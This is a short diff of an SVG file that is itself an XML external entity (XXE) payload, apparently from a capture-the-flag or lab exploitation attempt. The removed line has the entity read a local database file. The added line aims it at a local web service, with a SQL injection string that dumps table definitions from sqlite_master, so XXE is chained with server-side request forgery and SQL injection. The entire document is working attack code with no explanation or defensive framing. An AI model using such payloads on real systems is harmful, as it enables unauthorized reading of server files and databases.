@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///app/history.db">
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:5000/search?q=' UNION SELECT name,sql FROM sqlite_master WHERE type='table' --">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">
   <text x="10" y="20">&xxe;</text>
